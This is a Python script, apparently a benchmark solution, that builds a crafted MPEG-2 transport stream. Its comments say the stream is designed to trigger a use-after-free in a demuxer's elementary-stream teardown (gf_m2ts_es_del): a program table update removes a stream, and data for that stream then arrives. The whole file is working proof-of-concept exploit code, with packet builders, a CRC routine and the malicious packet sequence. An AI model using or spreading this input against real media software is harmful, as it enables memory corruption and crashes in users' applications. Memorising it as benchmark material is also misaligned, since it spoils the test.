import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        return self.generate_poc()
        
    def generate_poc(self) -> bytes:
        packets = []
        
        # PIDs
        PID_PAT = 0x0000
        PID_PMT = 0x0100
        PID_ES  = 0x0200
        PID_NULL = 0x1FFF
        
        # 1. PAT: Associates Program 1 with PID_PMT
        packets.append(self.make_pat(PID_PAT, PID_PMT, cc=0))
        
        # 2. PMT Version 0: Defines Program 1 having ES at PID_ES (Stream Type 0x0F - AAC)
        # Using a stream type that allocates a buffer/structure is critical.
        packets.append(self.make_pmt(PID_PMT, version=0, es_pid=PID_ES, stream_type=0x0F, cc=0))
        
        # 3. ES Data (Start): PUSI=1. Start a PES packet.
        # This allocates context for this PID in the demuxer.
        # PES Header: 00 00 01 C0 (Audio Stream 0) 00 64 (Len 100)
        # Flags: 80 00 (PTS present, but header len 0 -> effectively just standard PES)
        pes_payload = b'\x00\x00\x01\xC0\x00\x64\x80\x00' + b'A'*100
        packets.append(self.make_ts_packet(PID_ES, pes_payload, pusi=True, cc=0))
        
        # 4. PMT Version 1: Updates Program 1, REMOVING PID_ES.
        # This should trigger gf_m2ts_es_del for PID_ES, freeing the ES structure.
        packets.append(self.make_pmt(PID_PMT, version=1, es_pid=None, stream_type=0x00, cc=1))
        
        # 5. ES Data (Continuation): PUSI=0. More data for the same PES packet.
        # If the demuxer logic for "current packet" or "next sequence" holds a dangling reference 
        # to the freed ES structure, this access triggers the UAF.
        packets.append(self.make_ts_packet(PID_ES, b'B'*100, pusi=False, cc=1))
        
        # 6. Padding to reach 1128 bytes (Ground Truth length suggests ~1KB required)
        packets.append(self.make_ts_packet(PID_NULL, b'\xFF'*184, pusi=False, cc=0))
        
        return b''.join(packets)

    def crc32_mpeg2(self, data: bytes) -> int:
        crc = 0xFFFFFFFF
        for byte in data:
            crc ^= (byte << 24)
            for _ in range(8):
                if crc & 0x80000000:
                    crc = (crc << 1) ^ 0x04C11DB7
                else:
                    crc <<= 1
                crc &= 0xFFFFFFFF
        return crc

    def make_ts_packet(self, pid: int, payload: bytes, pusi: bool, cc: int) -> bytes:
        header = bytearray(4)
        header[0] = 0x47
        header[1] = (0x40 if pusi else 0x00) | ((pid >> 8) & 0x1F)
        header[2] = pid & 0xFF
        
        if len(payload) < 184:
            # Adaptation Field for stuffing
            afc = 3
            stuffing_len = 184 - len(payload)
            af_len = stuffing_len - 1
            af = bytearray()
            af.append(af_len)
            if af_len > 0:
                af.append(0x00) # Flags
                if af_len > 1:
                    af += b'\xFF' * (af_len - 1)
            packet_payload = af + payload
        else:
            afc = 1
            packet_payload = payload[:184]
        
        header[3] = (afc << 4) | (cc & 0x0F)
        return header + packet_payload

    def make_pat(self, pid: int, pmt_pid: int, cc: int) -> bytes:
        data = bytearray()
        data += struct.pack('>H', 0x0001) # ProgNum 1
        data += struct.pack('>H', 0xE000 | pmt_pid) # PID
        
        # Section Length: Header(5) + Data(4) + CRC(4) = 13
        section_len = 5 + len(data) + 4
        
        section = bytearray()
        section.append(0x00) # Table ID
        section += struct.pack('>H', 0xB000 | section_len)
        section += struct.pack('>H', 0x0001) # TSID
        section.append(0xC1) # Ver 0, CN 1
        section.append(0x00) # Sec
        section.append(0x00) # Last
        section += data
        
        crc = self.crc32_mpeg2(section)
        section += struct.pack('>I', crc)
        
        # Pointer field 0
        payload = b'\x00' + section
        return self.make_ts_packet(pid, payload, pusi=True, cc=cc)

    def make_pmt(self, pid: int, version: int, es_pid: int, stream_type: int, cc: int) -> bytes:
        data = bytearray()
        data += struct.pack('>H', 0xE000 | 0x1FFF) # PCR PID (Padding)
        data += struct.pack('>H', 0xF000) # ProgInfoLen 0
        
        if es_pid is not None:
            data.append(stream_type)
            data += struct.pack('>H', 0xE000 | es_pid)
            data += struct.pack('>H', 0xF000) # ES Info Len 0
            
        section_len = 5 + len(data) + 4
        
        section = bytearray()
        section.append(0x02) # Table ID
        section += struct.pack('>H', 0xB000 | section_len)
        section += struct.pack('>H', 0x0001) # Prog Num
        ver_byte = 0xC1 | ((version & 0x1F) << 1)
        section.append(ver_byte)
        section.append(0x00)
        section.append(0x00)
        section += data
        
        crc = self.crc32_mpeg2(section)
        section += struct.pack('>I', crc)
        
        payload = b'\x00' + section
        return self.make_ts_packet(pid, payload, pusi=True, cc=cc)